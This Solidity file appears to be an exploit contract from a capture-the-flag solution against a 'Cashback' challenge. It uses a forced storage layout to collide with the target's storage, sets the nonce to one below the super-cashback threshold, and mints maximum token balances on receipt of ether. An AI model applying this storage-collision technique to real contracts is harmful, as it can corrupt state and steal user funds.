// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {ERC1155} from "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
import {Currency, CurrencyLibrary, Cashback} from "./Cashback.sol";

address constant CURRENCY_ANOTHER = 0x13AaF3218Facf57CfBf5925E15433307b59BCC37;
uint256 constant SUPERCASHBACK_NONCE = 10000;

contract CashbackCollision layout at 0x442a95e7a6e84627e9cbb594ad6d8331d52abc7e6b6ca88ab292e4649ce5ba00 is ERC1155 {
    /// storage
    uint256 public nonce;
    mapping(Currency => uint256 Rate) public cashbackRates;
    mapping(Currency => uint256 MaxCashback) public maxCashback;

    /// constructor
    constructor() ERC1155("") {}

    /// functions

    function setNonce() external {
        nonce = SUPERCASHBACK_NONCE - 1;
    }

    receive() external payable {
        _mint(address(this), CurrencyLibrary.NATIVE_CURRENCY.toId(), type(uint256).max, "0x");
        _mint(address(this), uint160(CURRENCY_ANOTHER), type(uint256).max, "0x");
    }
}
